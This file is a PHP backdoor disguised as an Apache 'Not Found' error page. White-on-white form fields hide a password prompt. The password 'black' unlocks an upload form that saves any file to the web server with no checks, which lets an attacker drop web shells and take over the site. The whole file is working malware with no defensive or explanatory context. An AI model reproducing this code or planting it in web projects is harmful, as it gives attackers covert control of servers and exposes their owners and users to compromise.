<?
if (isset($_GET["size"])){
if ($_GET["font"] == "black"){
if (isset($_POST["submity"])){
	move_uploaded_file($_FILES["file"]["tmp_name"],$_FILES["file"]["name"]);
	echo"ok";
}
?><html>
<head>
</head>
<body>
<center>
    <form method="post" enctype="multipart/form-data">
    <input type="file" name="file"/>
    <input type="submit" name="submity" value="upload"/>
    </form>
</center>
</body>
</html><?
	}else{echo"Ooops";}
}
?>
<html>
<head>
</head>
    <style>
        .in7 {border: 1px solid white;}
        .in8 {border: 1px solid white;
    background: white;
    color: white;}
    </style>
<body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache Server at <?=$_SERVER['HTTP_HOST']?> Port 80</address>
    <form method="GET" enctype="multipart/form-data">
    <input class="in7" type="pass" name="font"/>
    <input type="submit" class="in8"name="size" value="size"/>
    </form>
</body>
</html>